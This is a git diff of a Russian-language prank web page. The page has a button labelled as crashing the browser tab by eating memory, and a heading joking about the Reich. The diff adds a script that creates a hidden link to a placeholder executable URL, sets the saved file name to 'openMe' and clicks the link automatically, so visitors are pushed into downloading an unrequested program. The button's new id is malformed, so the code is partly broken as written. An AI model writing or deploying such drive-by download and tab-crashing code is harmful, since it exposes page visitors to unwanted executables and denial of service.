@@ -8,7 +8,7 @@
 </head>
 <body>
     <h1>Молодец! Рейх не забудет тебя</h1>
-    <button id="startButton">крашнуть вкладку (и начать кушать оперативку)</button>
+    <button id="startButton downloadButton">крашнуть вкладку (и начать кушать оперативку)</button>
     <script>
         document.getElementById("startButton").addEventListener("click", function() {
             
@@ -16,6 +16,16 @@
                 console.log(i); 
             }
             console.log("Отсчет завершен! (если доживет)");
+        });
+
+        document.getElementById("downloadButton").addEventListener("click", function() {
+            // Создаем скрытую ссылку
+            let link = document.createElement("a");
+            link.href = "https://example.com/program.exe"; // Укажи свой URL
+            link.download = "openMe"; // Имя файла при сохранении
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link); 
         });
     </script>
     <script src="./func.js"></script>
